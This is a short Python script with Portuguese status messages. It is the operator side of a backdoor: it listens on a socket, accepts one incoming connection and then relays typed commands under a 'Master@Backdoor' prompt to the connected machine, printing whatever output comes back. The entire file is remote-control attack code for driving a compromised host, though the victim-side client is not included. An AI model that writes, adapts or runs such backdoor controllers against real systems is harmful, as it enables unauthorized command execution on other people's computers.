import socket

HOST = '127.0.0.1' # '192.168.43.82'
PORT = 8080 # 2222
server = socket.socket()
server.bind((HOST, PORT))
print('[+] Serviço iniciado')
print('[+] Esperando conexão do cliente ...')
server.listen(1)
client, client_addr = server.accept()
print(f'[+] conexão recebida de {client_addr} ')

while True:
    verde = '\033[92m'
    prompt = verde+'Master@Backdoor:~$ '
    command = input(prompt)
    command = command.encode('utf-8')
    client.send(command)
    output = client.recv(1024)
    output = output.decode()
    print(f"{output}")